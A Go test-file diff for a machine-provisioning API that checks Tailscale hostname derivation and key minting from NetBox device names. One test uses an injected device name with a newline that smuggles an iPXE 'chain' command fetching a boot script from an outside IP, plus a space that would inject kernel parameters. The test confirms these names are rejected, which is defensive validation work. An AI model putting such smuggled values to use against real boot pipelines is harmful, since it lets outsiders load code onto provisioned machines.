@@ -1,11 +1,92 @@
 package api
 
 import (
+	"context"
 	"encoding/json"
+	"log/slog"
 	"testing"
 
+	"github.com/google/uuid"
+
 	"github.com/bluesky-social/slagworks/internal/model"
+	"github.com/bluesky-social/slagworks/internal/netbox"
+	"github.com/bluesky-social/slagworks/internal/store"
+	"github.com/bluesky-social/slagworks/internal/tailscale"
+	"github.com/bluesky-social/slagworks/internal/testpg"
 )
+
+// recordingMinter is a TailscaleMinter that records each request and
+// returns a fixed key.
+type recordingMinter struct{ reqs []tailscale.KeyRequest }
+
+func (m *recordingMinter) Mint(_ context.Context, kr tailscale.KeyRequest) (tailscale.MintedKey, error) {
+	m.reqs = append(m.reqs, kr)
+	return tailscale.MintedKey{Key: "tskey-auth-K9", ID: "k1"}, nil
+}
+
+// tailscaleServer builds a Server with a recording minter, a testpg store
+// and a NetBox stub holding one device named devName at site site-b, and
+// returns it with the id of the machine bound to that device.
+func tailscaleServer(t *testing.T, devName string) (*Server, uuid.UUID, *recordingMinter) {
+	t.Helper()
+	st := store.New(testpg.DB(t, store.Migrate))
+	devID := 310
+	dev := netbox.Device{
+		ID: devID, Name: devName, Serial: "SN-TS",
+		Site: &netbox.NestedRef{ID: 2, Name: "site-b", Slug: "site-b"},
+	}
+	f := &netboxFixture{devices: []netbox.Device{dev}, deviceByID: map[int]netbox.Device{devID: dev}}
+	nb := netbox.NewClient(netbox.ClientConfig{BaseURL: f.server(t).URL, Token: "t"})
+	id := uuid.New()
+	if err := st.CreateMachine(&model.Machine{
+		ID: id, NetBoxSerial: "SN-TS", NetBoxDeviceID: &devID, State: model.MachineStateRunning,
+	}); err != nil {
+		t.Fatalf("seed machine: %v", err)
+	}
+	m := &recordingMinter{}
+	return &Server{store: st, netbox: nb, tailscaleMinter: m, log: slog.Default()}, id, m
+}
+
+// TestResolveTailscaleRuntime_ValidName: a device named <short>.<pop> gets a
+// key minted for, and stamped with, the tailnet hostname <short>-<pop>.
+func TestResolveTailscaleRuntime_ValidName(t *testing.T) {
+	s, id, m := tailscaleServer(t, "mgmt-3.site-b")
+	var params model.OpParams
+	if err := s.resolveTailscaleRuntime(context.Background(), id, &params); err != nil {
+		t.Fatalf("resolve: %v", err)
+	}
+	if len(m.reqs) != 1 {
+		t.Fatalf("expected one mint, got %d", len(m.reqs))
+	}
+	ts := params.TailscaleRuntime
+	if ts == nil || ts.AuthKey != "tskey-auth-K9" || ts.Hostname != "mgmt-3-site-b" {
+		t.Errorf("tailscale_runtime = %+v, want key tskey-auth-K9, hostname mgmt-3-site-b", ts)
+	}
+}
+
+// TestResolveTailscaleRuntime_NameNotAHostname: NetBox stores a device name
+// as free text. A name that does not give a valid tailnet hostname (here a
+// newline that would add an iPXE command to the deploy boot script, or a
+// space that would add kernel parameters) skips enrollment: no key is
+// minted and the op carries no tailscale_runtime block.
+func TestResolveTailscaleRuntime_NameNotAHostname(t *testing.T) {
+	for _, name := range []string{
+		"web1\nchain http://203.0.113.9/x.ipxe",
+		"web1 break x.site-b",
+	} {
+		s, id, m := tailscaleServer(t, name)
+		var params model.OpParams
+		if err := s.resolveTailscaleRuntime(context.Background(), id, &params); err != nil {
+			t.Fatalf("device %q: resolve: %v", name, err)
+		}
+		if len(m.reqs) != 0 {
+			t.Errorf("device %q: expected no mint, got %+v", name, m.reqs)
+		}
+		if params.TailscaleRuntime != nil {
+			t.Errorf("device %q: expected no tailscale_runtime, got %+v", name, params.TailscaleRuntime)
+		}
+	}
+}
 
 // TestTailnetHostname covers the <short>-<pop> derivation that must match
 // ansible's tailscale_hostname (group_vars/all) so a re-deploy reuses the
